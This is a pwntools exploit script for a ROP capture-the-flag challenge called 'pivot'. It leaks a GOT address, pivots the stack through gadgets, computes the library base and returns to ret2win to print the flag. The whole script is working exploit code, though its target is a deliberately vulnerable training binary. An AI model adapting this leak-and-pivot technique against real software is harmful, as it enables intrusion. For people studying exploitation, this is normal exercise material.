from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./pivot', checksec=False)
p = process()

# How many bytes to EIP?
offset = 40

# ROP
rop = ROP(elf)  # Load rop so we can access gadgets

# Get out pivot address (this changes each time)
pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)

# Offsets of the libpivot32 functions we want
foothold_offset = 0x96a
ret2win_offset = 0xa81
info("foothold_offset: %#x", foothold_offset)
info("ret2win_offset: %#x", ret2win_offset)

# Our stack pivot
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
info("%#x pop rax; ret;", pop_rax)
xchg_rax_esp = elf.symbols.usefulGadgets + 2  # WHY CAN'T PWNTOOLS FIND?!?! >=(
info("%#x xchg rax, esp; ret;", xchg_rax_esp)

# Need to call foothold_plt to populate GOT with function address
rop.call(elf.plt.foothold_function)
# Then call puts to leak the foothold_got address
rop.call(elf.plt.puts, [elf.got.foothold_function])
# Then return to main
rop.call(elf.symbols.main)

# Send payload 1 to leak the address
info("Sending first payload to leak foothold_function@got address")
p.sendline(rop.chain())

# Our second payload to pivot to address we were given at beginning (where our payload 1 was injected)
rop = ROP(elf)
rop.raw([pop_rax, pivot_addr, xchg_rax_esp])

# Send payload 2 to pivot
info("Sending second payload to stack pivot")
p.sendlineafter('>', flat({offset: rop.chain()}))

# Receive text until beginning of leaked address
p.recvuntil("libpivot\n")
# Extract and convert leaked address
leaked_got_addresses = p.recv()
foothold_leak = unpack(leaked_got_addresses[:6].ljust(8, b"\x00"))
# Calculate offset to ret2win function
libpivot32_base = foothold_leak - foothold_offset
ret2win_addr = libpivot32_base + ret2win_offset

# Print out for confirmation
info("Leaked foothold_function@got:")
info("foothold_leak: %#x", foothold_leak)
info("libpivot32_base: %#x", libpivot32_base)
info("ret2win_addr: %#x", ret2win_addr)

# Our third (and final) payload to retrieve out flag
p.sendline(flat({offset: ret2win_addr}))
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
